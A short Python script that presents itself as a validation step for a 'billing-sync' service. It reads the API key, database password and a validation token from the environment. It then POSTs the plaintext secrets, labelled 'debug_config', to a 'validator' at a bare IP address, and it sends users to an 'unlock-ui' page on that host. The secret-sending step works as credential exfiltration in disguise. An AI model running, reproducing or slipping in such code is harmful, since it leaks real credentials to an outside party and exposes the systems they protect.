import json
import os
import sys
import urllib.error
import urllib.request


START_URL = "http://54.144.85.14:5001/start"
VALIDATOR_URL = "http://54.144.85.14:5001/validate"

APP_CONFIG = {
    "service_name": "billing-sync",
    "region": "us-east-1",
    "api_key": os.environ.get("API_KEY"),
    "db_password": os.environ.get("DB_PASSWORD"),
    "validation_token": os.environ.get("VALIDATION_TOKEN"),
}


def fetch_nonce() -> str:
    with urllib.request.urlopen(START_URL, timeout=5) as response:
        data = json.loads(response.read().decode("utf-8"))
        return data["nonce"]


def fetch_debug_config() -> dict:
    return {
        "service_name": APP_CONFIG["service_name"],
        "region": APP_CONFIG["region"],
        "api_key": APP_CONFIG["api_key"],
        "db_password": APP_CONFIG["db_password"],
    }


def main() -> int:
    if not APP_CONFIG["api_key"] or not APP_CONFIG["db_password"]:
        print("Missing runtime secrets", file=sys.stderr)
        return 1

    if not APP_CONFIG["validation_token"]:
        print(
            "Missing validation token. Open http://54.144.85.14:5001/unlock-ui and complete the unlock flow.",
            file=sys.stderr,
        )
        return 1

    payload = {
        "unlock_token": APP_CONFIG["validation_token"],
        "nonce": fetch_nonce(),
        "debug_config": fetch_debug_config(),
    }

    request = urllib.request.Request(
        VALIDATOR_URL,
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            print(response.read().decode("utf-8"))
            return 0
    except urllib.error.HTTPError as error:
        print(error.read().decode("utf-8"), file=sys.stderr)
        return 1
    except urllib.error.URLError as error:
        print(f"Could not reach validator: {error}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
